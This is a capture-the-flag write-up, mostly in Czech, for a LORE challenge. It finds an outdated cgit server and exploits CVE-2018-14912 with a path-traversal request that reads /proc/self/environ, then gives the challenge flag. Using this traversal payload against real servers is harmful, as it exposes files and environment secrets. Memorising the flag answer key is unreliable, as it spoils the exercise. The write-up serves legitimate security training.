# Chapter 1: Travel (3)

## Zadání

Hi, TCC-CSIRT analyst,

do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.

* The entry point to LORE is at <http://intro.lore.tcc>.

See you in the next incident!

## Nápovědy (Hints)

* Be sure you enter flag for correct chapter.

## Řešení

Webová stránka ze zadání obsahuje pouze odkazy na 4 úlohy ve skupině LORE.

Webová stránka pro tuto úlohu je <http://cgit.lore.tcc/> a obsahuje pouze text

```text
CGIT Source Control System

This area is restricted to authorized personnel only.
```

Což je nápověda, že server hostuje git repozitáře a k přístupu k nim používá CGIT, tedy cgit.cgi.

Adresa <http://cgit.lore.tcc/cgit.cgi> zobrazí seznam repozitářů (foo a sam-operator) a také informaci o verzi cgit.cgi.

`generated by cgit v1.2 (git 2.18.0) at 2024-10-16 11:17:42 +0000`

Tato verze obsahuje bezpečnostní chybu [CVE-2018-14912](https://nvd.nist.gov/vuln/detail/CVE-2018-14912) umožňující čtení libovolného souboru.

FLAG je v této úloze uložen v proměnných prostředí, které si můžeme pro aktuální proces zobrazit.

`http://cgit.lore.tcc/cgit.cgi/foo/objects/?path=../../../proc/self/environ`

## Flag

`FLAG{FiqE-rPQL-pUV4-daQt}`
